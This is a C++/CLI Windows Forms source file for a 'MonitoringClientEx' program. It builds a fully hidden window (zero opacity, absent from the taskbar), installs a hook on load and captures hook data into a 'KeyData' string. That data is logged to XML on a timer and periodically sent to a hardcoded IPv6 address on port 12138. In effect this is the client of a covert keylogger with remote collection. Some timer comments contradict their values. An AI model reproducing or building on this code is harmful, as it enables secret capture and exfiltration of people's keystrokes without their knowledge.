#pragma once


namespace MonitoringClientEx {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Form1 摘要
	///
	/// 警告: 如果更改此类的名称，则需要更改
	///          与此类所依赖的所有 .resx 文件关联的托管资源编译器工具的
	///          “资源文件名”属性。否则，
	///          设计器将不能与此窗体的关联
	///          本地化资源正确交互。
	/// </summary>
	public ref class Form1 : public System::Windows::Forms::Form
	{
	public:
		Form1(void)
		{
			InitializeComponent();
			//
			//TODO: 在此处添加构造函数代码
			//
		}
	protected:
		/// <summary>
		/// 清理所有正在使用的资源。
		/// </summary>
		~Form1()
		{
			if (components)
			{
				delete components;
			}
		}

	private:
		/// <summary>
		/// 必需的设计器变量。
		hookpro^NewHook = gcnew hookpro();
		String^KeyData = "";
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// 设计器支持所需的方法 - 不要
		/// 使用代码编辑器修改此方法的内容。
		/// </summary>
		void InitializeComponent(void)
		{
			this->SuspendLayout();
			// 
			// Form1
			// 
			this->AccessibleRole = System::Windows::Forms::AccessibleRole::None;
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::None;
			this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::None;
			this->CausesValidation = false;
			this->ClientSize = System::Drawing::Size(284, 262);
			this->ControlBox = false;
			this->Enabled = false;
			this->ImeMode = System::Windows::Forms::ImeMode::Off;
			this->MaximizeBox = false;
			this->MinimizeBox = false;
			this->Name = L"Form1";
			this->Opacity = 0;
			this->RightToLeftLayout = true;
			this->ShowIcon = false;
			this->ShowInTaskbar = false;
			this->StartPosition = System::Windows::Forms::FormStartPosition::Manual;
			this->Load += gcnew System::EventHandler(this, &Form1::Form1_Load);
			this->ResumeLayout(false);

		}
#pragma endregion
	private: System::Void Form1_Load(System::Object^  sender, System::EventArgs^  e) { 
				
				 XmlOperator^xmlOp = gcnew XmlOperator();
				 hookpro^ hook = gcnew hookpro();
				 //创建进程监视消息
					TimeData^_TimeData = gcnew TimeData();
				 _TimeData->DayOver += gcnew TimeData::DelegateDayOverEvent(xmlOp, &XmlOperator::WriteNode);
				 _TimeData->GetTime();
				 if(hook->SetHook()==0)//创建钩子
					MessageBox::Show("钩子安装成功");
				 ThreadStart^ MsStar = gcnew ThreadStart(NewHook,&hookpro::GetHookData);
				 Thread^ MessageThread = gcnew Thread(MsStar);//创建一个线程检测钩子信息
				 MessageThread->IsBackground = true;
				 MessageThread->Start();
				 Windows::Forms::Timer^_IsTimeWriteNode = gcnew Windows::Forms::Timer();
				 _IsTimeWriteNode->Tick+=gcnew System::EventHandler(this, &MonitoringClientEx::Form1::OnTick);//写文件定时器
				 _IsTimeWriteNode->Interval = 20000;//定时10s
				 _IsTimeWriteNode->Start();
				 Windows::Forms::Timer^_IsTimeSendData = gcnew  Windows::Forms::Timer();//数据交互定时器
				 _IsTimeSendData->Tick+=gcnew System::EventHandler(this, &MonitoringClientEx::Form1::OnTickSendTime);
				 _IsTimeSendData->Interval = 10000;//定时60s
				 _IsTimeSendData->Start();

	}
			 void OnTick(System::Object ^sender, System::EventArgs ^e);
			 void OnTickSendTime(System::Object ^sender, System::EventArgs ^e);
	};
}

void MonitoringClientEx::Form1::OnTick(System::Object ^sender, System::EventArgs ^e)
{
	KeyData = String::Empty;
	TimeData^_TimeData = gcnew TimeData();
	XmlOperator^xmlOp = gcnew XmlOperator();
	KeyData += NewHook->SHookData;
	if (KeyData == "")
		return;
	xmlOp->WriteElement(_TimeData->Day,_TimeData->Time,KeyData,"N");
	NewHook->SHookData = String::Empty;
	KeyData =String::Empty;
}


void MonitoringClientEx::Form1::OnTickSendTime(System::Object ^sender, System::EventArgs ^e)
{
	Client^_Client = gcnew Client();
	if (_Client->CreatClient("fe80::10ad:9927:49a4:2f9b%14",12138) == -1)
	{
		_Client->StopClient();
		return;
	}
	if (_Client->SendClientData() == -1)
	{
		_Client->StopClient();
		return;
	}

}
